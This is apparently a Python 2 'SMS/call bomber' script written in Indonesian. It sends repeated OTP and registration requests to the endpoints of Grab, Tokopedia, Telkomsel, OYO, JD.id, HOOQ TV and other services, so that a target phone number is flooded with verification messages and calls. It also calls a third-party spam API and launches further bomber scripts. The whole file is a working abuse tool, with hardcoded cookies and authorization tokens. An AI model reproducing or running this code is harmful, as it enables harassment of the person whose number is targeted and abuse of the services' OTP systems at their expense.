# -*- coding: utf-8 -*-
import json, mechanize, os, requests, sys, time
from warna import *
reload (sys)
sys.setdefaultencoding ("utf8")


with open ("nomor.json") as baca:
	jl = json.load(baca)
	nomor = jl["nomor"]
	jumlah = int(jl["jumlah"])
	jeda = jl["jeda"]
	nomor1 = nomor[1:]
	nomor2 = "62"+ nomor[1:]


def koneksi():
	titik = ["   ", "•  ", "•• ", "•••"]
	for t in titik:
		print m +"\r!!! Aktifkan Koneksi Internet "+ n + t,
		sys.stdout.flush()
		time.sleep (1)


def Call_Grab():
	berhasil = 0
	gagal = 0
	try:
		j = 0
		while (j < jumlah):
			j+= 1
			rp = requests.post ("https://api.grab.com/grabid/v1/phone/otp", data = {"method": "CALL", "countryCode": "id", "phoneNumber": nomor2, "templateID": "pax_android_production"}).text
			if str("challengeID") in str(rp):
				berhasil+= 1
				print h +"\rCall"+ ug +" Grab "+ n +"•"+ k +" Mengirim Pesan"+ n +" => "+ b + str(j) + h +" ✔ ",
			else:
				gagal+= 1
				print h +"\rCall"+ ug +" Grab "+ n +"•"+ k +" Mengirim Pesan"+ n +" => "+ b + str(j) + m +" ✘ ",
			sys.stdout.flush()
			os.system ("sleep "+ jeda)
		print h +"\rCall"+ ug +" Grab "+ n +"•"+ h +" Berhasil"+ n +" => "+ h + str(berhasil) + u +" |"+ m +" Gagal"+ n +" => "+ m + str(gagal)
	except (requests.exceptions.ConnectionError):
		koneksi()
		Call_Grab()


def Call_Tokopedia():
	berhasil = 0
	gagal = 0
	try:
		j = 0
		while (j < jumlah):
			j+= 1
			rp = requests.post ("https://www.tokocash.com/oauth/otp", data = {"msisdn": nomor, "accept=": "call"}).text
			if str("200000") in str(rp):
				berhasil+= 1
				print h +"\rCall"+ ut +" Tokopedia "+ n +"•"+ k +" Mengirim Pesan"+ n +" => "+ b + str(j) + h +" ✔ ",
			else:
				gagal+= 1
				print h +"\rCall"+ ut +" Tokopedia "+ n +"•"+ k +" Mengirim Pesan"+ n +" => "+ b + str(j) + m +" ✘ ",
			sys.stdout.flush()
			os.system ("sleep "+ jeda)
		print h +"\rCall"+ ut +" Tokopedia "+ n +"•"+ h +" Berhasil"+ n +" => "+ h + str(berhasil) + u +" |"+ m +" Gagal"+ n +" => "+ m + str(gagal)
	except (requests.exceptions.ConnectionError):
		koneksi()
		Call_Tokopedia()


def Sms_4444():
	berhasil = 0
	gagal = 0
	try:
		j = 0
		while (j < jumlah):
			j+= 1
			rp = requests.post ("https://registrasi.tri.co.id/daftar/generateOTP", data = {"msisdn": nomor}, headers = {"Accept": "application/json, text/javascript, */*; q=0.01", "Cookie": "PHPSESSID=5noisam2cugiq25l6374u79975", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.62 Safari/537.36"}).text
			if str("success") in str(rp):
				berhasil+= 1
				print k +"\rSms"+ u4 +" 4444 "+ n +"•"+ k +" Mengirim Pesan"+ n +" => "+ b + str(j) + h +" ✔ ",
			else:
				gagal+= 1
				print k +"\rSms"+ u4 +" 4444 "+ n +"•"+ k +" Mengirim Pesan"+ n +" => "+ b + str(j) + m +" ✘ ",
			sys.stdout.flush()
			os.system ("sleep "+ jeda)
		print k +"\rSms"+ u4 +" 4444 "+ n +"•"+ h +" Berhasil"+ n +" => "+ h + str(berhasil) + u +" |"+ m +" Gagal"+ n +" => "+ m + str(gagal)
	except (requests.exceptions.ConnectionError):
		koneksi()
		Sms_4444()


def Sms_Grab():
	berhasil = 0
	gagal = 0
	try:
		j = 0
		while (j < jumlah):
			j+= 1
			rp = requests.post ("https://p.grabtaxi.com/api/passenger/v2/profiles/register", data = {"phoneNumber": nomor2, "countryCode": "ID", "name": "IRUL", "email": "IRUL@gmail.com", "deviceToken": "*"}, headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"}).text
			if str("phoneNumber") in str(rp):
				berhasil+= 1
				print k +"\rSms"+ ug +" Grab "+ n +"•"+ k +" Mengirim Pesan"+ n +" => "+ b + str(j) + h +" ✔ ",
			else:
				gagal+= 1
				print k +"\rSms"+ ug +" Grab "+ n +"•"+ k +" Mengirim Pesan"+ n +" => "+ b + str(j) + m +" ✘ ",
			sys.stdout.flush()
			os.system ("sleep "+ jeda)
		print k +"\rSms"+ ug +" Grab "+ n +"•"+ h +" Berhasil"+ n +" => "+ h + str(berhasil) + u +" |"+ m +" Gagal"+ n +" => "+ m + str(gagal)
	except (requests.exceptions.ConnectionError):
		koneksi()
		Sms_Grab()


def Sms_HOOQTV():
	berhasil = 0
	gagal = 0
	try:
		j = 0
		while (j < jumlah):
			j+= 1
			br = mechanize.Browser()
			br.set_handle_equiv(True)
			br.set_handle_gzip(True)
			br.set_handle_redirect(True)
			br.set_handle_referer(True)
			br.set_handle_robots(False)
			br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
			br.addheaders = [("User-Agent","Mozilla/8.0 (Linux; U; Android 8.1)")]
			br.open ("https://authenticate.hooq.tv/signupmobile?returnUrl=https://m.hooq.tv%2Fauth%2Fverify%2Fev%2F%257Cdiscover&serialNo=c3125cc0-f09d-4c7f-b7aa-6850fabd3f4e&deviceType=webClient&modelNo=webclient-aurora&deviceName=webclient-aurora/production-4.2.0&deviceSignature=02b480a474b7b2c2524d45047307e013e8b8bc0af115ff5c3294f787824998e7")
			br.select_form(nr=0)
			br.form["mobile"] = nomor1
			br.form["password"] = "JEKITUT"
			rbs = br.submit().read()
			if str("confirmotp") in str(rbs):
				berhasil+= 1
				print k +"\rSms"+ uh +" HOOQTV "+ n +"•"+ k +" Mengirim Pesan"+ n +" => "+ b + str(j) + h +" ✔ ",
			else:
				gagal+= 1
				print k +"\rSms"+ uh +" HOOQTV "+ n +"•"+ k +" Mengirim Pesan"+ n +" => "+ b + str(j) + m +" ✘ ",
			sys.stdout.flush()
			os.system ("sleep "+ jeda)
		print k +"\rSms"+ uh +" HOOQTV "+ n +"•"+ h +" Berhasil"+ n +" => "+ h + str(berhasil) + u +" |"+ m +" Gagal"+ n +" => "+ m + str(gagal)
	except (requests.exceptions.ConnectionError):
		koneksi()
		Sms_HOOQTV()


def Sms_JOY_JD_id():
	berhasil = 0
	gagal = 0
	try:
		j = 0
		while (j < jumlah):
			j+= 1
			rp = requests.post ("https://passport.jd.id/sms/sendSMSCode", data = {"phone": nomor}, headers = {"Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Cookie": "__jda=161319996.15195775008192065165156.1519577501.1519892386.1523711222.3", "Connection": "keep-alive", "Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "Host": "passport.jd.id", "Referer": "https://passport.jd.id/register/phone", "X-Requested-With": "XMLHttpRequest"}).text
			if str("true") in str(rp):
				berhasil+= 1
				print k +"\rSms"+ uj +" JOY-JD.id "+ n +"•"+ k +" Mengirim Pesan"+ n +" => "+ b + str(j) + h +" ✔ ",
			else:
				gagal+= 1
				print k +"\rSms"+ uj +" JOY-JD.id "+ n +"•"+ k +" Mengirim Pesan"+ n +" => "+ b + str(j) + m +" ✘ ",
			sys.stdout.flush()
			os.system ("sleep "+ jeda)
		print k +"\rSms"+ uj +" JOY-JD.id "+ n +"•"+ h +" Berhasil"+ n +" => "+ h + str(berhasil) + u +" |"+ m +" Gagal"+ n +" => "+ m + str(gagal)
	except (requests.exceptions.ConnectionError):
		koneksi()
		Sms_JOY_JD_id()


def Sms_OYOHOTELS_1():
	berhasil = 0
	gagal = 0
	try:
		j = 0
		while (j < jumlah):
			j+= 1
			rg = requests.get ("https://www.oyorooms.com/api/pwa/generateotp?phone="+ nomor +"&country_code=+62").text
			if str("correct") in str(rg):
				berhasil+= 1
				print k +"\rSms"+ uo +" OYOHOTELS "+ n +"•"+ k +" Mengirim Pesan"+ n +" => "+ b + str(j) + h +" ✔ ",
			else:
				gagal+= 1
				print k +"\rSms"+ uo +" OYOHOTELS "+ n +"•"+ k +" Mengirim Pesan"+ n +" => "+ b + str(j) + m +" ✘ ",
			sys.stdout.flush()
			os.system ("sleep "+ jeda)
		print k +"\rSms"+ uo +" OYOHOTELS "+ n +"•"+ h +" Berhasil"+ n +" => "+ h + str(berhasil) + u +" |"+ m +" Gagal"+ n +" => "+ m + str(gagal)
	except (requests.exceptions.ConnectionError):
		koneksi()
		Sms_OYOHOTELS_1()


def Sms_OYOHOTELS_2():
	berhasil = 0
	gagal = 0
	try:
		j = 0
		while (j < jumlah):
			j+= 1
			rg = requests.get ("https://api.oyorooms.com/v2/users/generate_otp?phone="+ nomor +"&nod=4&intent=login&sms_auto_retrieval=true&country_code=%2B62&version=20176&partner_app_version=20176&android_id=6bb443543d62ab32&idfa=f4883355-288c-4528-b38f-d52ac56746f4&sid=154377531495", headers = {"access_token": "QmpDZlRxZWo2UkZ5M3pSeHZ5NW46bi13NHN0ZTV5V1I1aGpCUVVHOUM=", "Authorization": "Basic QmpDZlRxZWo2UkZ5M3pSeHZ5NW46bi13NHN0ZTV5V1I1aGpCUVVHOUM=", "Content-Type": "application/json", "OYO_AB_CONFIG": "1543775334527|dea:1|mwhp:1|t3c:1|epba:0|rst2:1|phbb:0|wcta:1|wtea:1|cdr2:0|popl:0|bann:1|sbma:1|rae:1|gmfh:1|prep:1|hbna:1|absb:0|sbmi:1|se5:10|se4:1|se6:15|cour:0|gsra:1|rtsi:1|cdr:1|rd:1|lzpi:1|uprc:1|rbl:1|rsa:0|dww2:1|deal:0|pnpd:1|rcua:1|rsi:0|gsti:1|dwep:2|otp4:1|urha:1|ppa:2|ona:0|svh:1|stc2:1|urhi:1|ppi:2|gsta:0|nlab:1|asa:1|cr:1|rts:1|nlp:1|onab:1|asi:0|wtei:1|asei:1|bsba:2|aca:1|bea:1|wtib:2|lyr:0|aci:0|scta:0|tspk:1|tspj:1|DWWS:1|a2hs:1|brch:4|test:1|raab:0|aswp:1|shli:0|hrt:1|riab:0|hbad:0|rcui:1|sbpa:0|stcl:0|sbpi:0|sinc:1|shla:0|brea:1|lpta:0|lpti:0|ffab:1|his2:0|hbci:1|pst:1|stfi:2|pce:1|stft:2|omue:0|brei:1|hsei:0|sold:1|hbca:1|home:1|scti:0|otab:1|gsa:1|dwhp:0|gsi:1|rasl:0|locr:0|obai:1|dbad:1|nrca:1|epa:2|nrci:1|epi:0|epn:2|fbb:0|trab:1|rmo2:1|niab:0|weng:0|sls:1|phli:0|gpwa:0|nsl:0|prpa:1|saet:1|gpwi:0|nrfa:0|prpi:1|hbi2:0|saea:1|mrc:1|blh:1|cpab:1|hpsa:0|octt:1|phb:1|hpsi:0|cadd:1|nsfa:1|oban:1|spc2:1|smla:0|auto:0|uiab:1|wtab:3|shel:1|hmpi:1|bdpi:1|pbra:1|sos:2|logn:1|rms:1|uaab:1|papg:1|bdpa:1|pbri:1|nob2:1|swar:1|aowt:1|spc:1|trCl:1|lbh:1|nrfi:0|lsc:1|pdhi:0|tsb:1|lsc2:0|diei:1|dmme:1|diea:1|dte:1|acsi:1|pdha:0|mwen:0|efa:1|hpwa:0|fbb2:0|sra:2|reca:1|paab:0|mwep:2|ngst:1|hpwi:1|reci:1|piab:1|aimg:1|ffib:1|mww2:1|ioab:1|hpfd:0|srz:0|socp:0|plwc:1", "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; MYA-L22 Build/HUAWEIMYA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36"}).text
			if str("status") in str(rg):
				berhasil+= 1
				print k +"\rSms"+ uo +" OYOHOTELS "+ n +"•"+ k +" Mengirim Pesan"+ n +" => "+ b + str(j) + h +" ✔ ",
			else:
				gagal+= 1
				print k +"\rSms"+ uo +" OYOHOTELS "+ n +"•"+ k +" Mengirim Pesan"+ n +" => "+ b + str(j) + m +" ✘ ",
			sys.stdout.flush()
			os.system ("sleep "+ jeda)
		print k +"\rSms"+ uo +" OYOHOTELS "+ n +"•"+ h +" Berhasil"+ n +" => "+ h + str(berhasil) + u +" |"+ m +" Gagal"+ n +" => "+ m + str(gagal)
	except (requests.exceptions.ConnectionError):
		koneksi()
		Sms_OYOHOTELS_2()


def Sms_PHD_Order():
	berhasil = 0
	gagal = 0
	try:
		j = 0
		while (j < jumlah):
			j+= 1
			rp = requests.post ("https://www.phd.co.id/en/users/sendOTP", data = {"phone_number": nomor}, headers = {"Referer": "https://www.phd.co.id/en/users/createnewuser", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"}).text
			if str("OK") in str(rp):
				berhasil+= 1
				print k +"\rSms"+ up +" PHD Order "+ n +"•"+ k +" Mengirim Pesan"+ n +" => "+ b + str(j) + h +" ✔ ",
			else:
				gagal+= 1
				print k +"\rSms"+ up +" PHD Order "+ n +"•"+ k +" Mengirim Pesan"+ n +" => "+ b + str(j) + m +" ✘ ",
			sys.stdout.flush()
			os.system ("sleep "+ jeda)
		print k +"\rSms"+ up +" PHD Order "+ n +"•"+ h +" Berhasil"+ n +" => "+ h + str(berhasil) + u +" |"+ m +" Gagal"+ n +" => "+ m + str(gagal)
	except (requests.exceptions.ConnectionError):
		koneksi()
		Sms_PHD_Order()


def Sms_SMSVIRO():
	berhasil = 0
	gagal = 0
	try:
		j = 0
		while (j < jumlah):
			j+= 1
			rp = requests.post ("https://api.mqpay.id/home/register-phone?device_id=01359024076564027&version=102", data = {"email": "", "phone": nomor}, headers = {"Content-Type": "application/x-www-form-urlencoded", "X-Authorization": "996e8f4eaba48cc98bd0baba50b4e5d0a61cfa4e", "User-Agent": "okhttp/3.8.0"}).text
			if str("Login success") in str(rp):
				berhasil+= 1
				print k +"\rSms"+ us +" SMSVIRO "+ n +"•"+ k +" Mengirim Pesan"+ n +" => "+ b + str(j) + h +" ✔ ",
			else:
				gagal+= 1
				print k +"\rSms"+ us +" SMSVIRO "+ n +"•"+ k +" Mengirim Pesan"+ n +" => "+ b + str(j) + m +" ✘ ",
			sys.stdout.flush()
			os.system ("sleep "+ jeda)
		print k +"\rSms"+ us +" SMSVIRO "+ n +"•"+ h +" Berhasil"+ n +" => "+ h + str(berhasil) + u +" |"+ m +" Gagal"+ n +" => "+ m + str(gagal)
	except (requests.exceptions.ConnectionError):
		koneksi()
		Sms_SMSVIRO()


def Sms_Tokopedia():
	berhasil = 0
	gagal = 0
	try:
		j = 0
		while (j < jumlah):
			j+= 1
			rp = requests.post ("https://www.tokocash.com/oauth/otp", data = {"msisdn": nomor, "accept=": ""}).text
			if str("200000") in str(rp):
				berhasil+= 1
				print k +"\rSms"+ ut +" Tokopedia "+ n +"•"+ k +" Mengirim Pesan"+ n +" => "+ b + str(j) + h +" ✔ ",
			else:
				gagal+= 1
				print k +"\rSms"+ ut +" Tokopedia "+ n +"•"+ k +" Mengirim Pesan"+ n +" => "+ b + str(j) + m +" ✘ ",
			sys.stdout.flush()
			os.system ("sleep "+ jeda)
		print k +"\rSms"+ ut +" Tokopedia "+ n +"•"+ h +" Berhasil"+ n +" => "+ h + str(berhasil) + u +" |"+ m +" Gagal"+ n +" => "+ m + str(gagal)
	except (requests.exceptions.ConnectionError):
		koneksi()
		Sms_Tokopedia()


def Sms_TSEL_APPS():
	berhasil = 0
	gagal = 0
	try:
		j = 0
		while (j < jumlah):
			j+= 1
			rp = requests.post ("https://tdwidm.telkomsel.com/passwordless/start", data = {"phone_number": "+"+ nomor2, "connection": "sms"}, headers = {"Accept": "application/json, text/javascripte", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US,en;q=0.9", "Connection": "keep-alive", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://my.telkomsel.com", "Referer": "https://my.telkomsel.com/", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36"}).text
			if str("_id") in str(rp):
				berhasil+= 1
				print k +"\rSms"+ ut +" TSEL-APPS "+ n +"•"+ k +" Mengirim Pesan"+ n +" => "+ b + str(j) + h +" ✔ ",
			else:
				gagal+= 1
				print k +"\rSms"+ ut +" TSEL-APPS "+ n +"•"+ k +" Mengirim Pesan"+ n +" => "+ b + str(j) + m +" ✘ ",
			sys.stdout.flush()
			os.system ("sleep "+ jeda)
		print k +"\rSms"+ ut +" TSEL-APPS "+ n +"•"+ h +" Berhasil"+ n +" => "+ h + str(berhasil) + u +" |"+ m +" Gagal"+ n +" => "+ m + str(gagal)
	except (requests.exceptions.ConnectionError):
		koneksi()
		Sms_TSEL_APPS()


def Url_Call_Grab():
	berhasil = 0
	gagal = 0
	try:
		j = 0
		while (j < jumlah):
			j+= 1
			rg = requests.get ("http://zlucifer.hol.es/api/call.php?nomor="+ nomor +"&method=grab").text
			if str("Spam Terkirim") in str(rg):
				berhasil+= 1
				print h +"\rCall"+ ug +" Grab "+ n +"•"+ k +" Mengirim Pesan"+ n +" => "+ b + str(j) + h +" ✔ ",
			else:
				gagal+= 1
				print h +"\rCall"+ ug +" Grab "+ n +"•"+ k +" Mengirim Pesan"+ n +" => "+ b + str(j) + m +" ✘ ",
			sys.stdout.flush()
			os.system ("sleep "+ jeda)
		print h +"\rCall"+ ug +" Grab "+ n +"•"+ h +" Berhasil"+ n +" => "+ h + str(berhasil) + u +" |"+ m +" Gagal"+ n +" => "+ m + str(gagal)
	except (requests.exceptions.ConnectionError):
		koneksi()
		Url_Call_Grab()


def Url_Sms_5_Pesan():
	berhasil = 0
	gagal = 0
	try:
		j = 0
		while (j < jumlah):
			j+= 1
			rg = requests.get ("http://zlucifer.hol.es/api/sms.php?nomor="+ nomor +"&paket=1").text
			if str("challengeID") in str(rg):
				berhasil+= 1
				print k +"\rSms"+ u5 +" 5 Pesan "+ n +"•"+ k +" Mengirim Pesan"+ n +" => "+ b + str(j) + h +" ✔ ",
			else:
				gagal+= 1
				print k +"\rSms"+ u5 +" 5 Pesan "+ n +"•"+ k +" Mengirim Pesan"+ n +" => "+ b + str(j) + m +" ✘ ",
			sys.stdout.flush()
			os.system ("sleep "+ jeda)
		print k +"\rSms"+ u5 +" 5 Pesan "+ n +"•"+ h +" Berhasil"+ n +" => "+ h + str(berhasil) + u +" |"+ m +" Gagal"+ n +" => "+ m + str(gagal)
	except (requests.exceptions.ConnectionError):
		koneksi()
		Url_Sms_5_Pesan()


def Url_Call_Tokopedia():
	berhasil = 0
	gagal = 0
	try:
		j = 0
		while (j < jumlah):
			j+= 1
			rg = requests.get ("http://zlucifer.hol.es/api/call.php?nomor="+ nomor +"&method=toped").text
			if str("Sisa limit harian telp ke nomor") in str(rg):
				berhasil+= 1
				print h +"\rCall"+ ut +" Tokopedia "+ n +"•"+ k +" Mengirim Pesan"+ n +" => "+ b + str(j) + h +" ✔ ",
			else:
				gagal+= 1
				print h +"\rCall"+ ut +" Tokopedia "+ n +"•"+ k +" Mengirim Pesan"+ n +" => "+ b + str(j) + m +" ✘ ",
			sys.stdout.flush()
			os.system ("sleep "+ jeda)
		print h +"\rCall"+ ut +" Tokopedia "+ n +"•"+ h +" Berhasil"+ n +" => "+ h + str(berhasil) + u +" |"+ m +" Gagal"+ n +" => "+ m + str(gagal)
	except (requests.exceptions.ConnectionError):
		koneksi()
		Url_Call_Tokopedia()


Call_Grab()
Call_Tokopedia()
Sms_4444()
Sms_Grab()
Sms_HOOQTV()
Sms_JOY_JD_id()
Sms_OYOHOTELS_1()
Sms_OYOHOTELS_2()
Sms_PHD_Order()
Sms_SMSVIRO()
Sms_Tokopedia()
Sms_TSEL_APPS()
Url_Call_Grab()
Url_Sms_5_Pesan()
Url_Call_Tokopedia()
os.system ("php irul.php")
os.system ("python2 Sms_4444 "+ nomor)
os.system ("python2 Sms_INFO "+ nomor)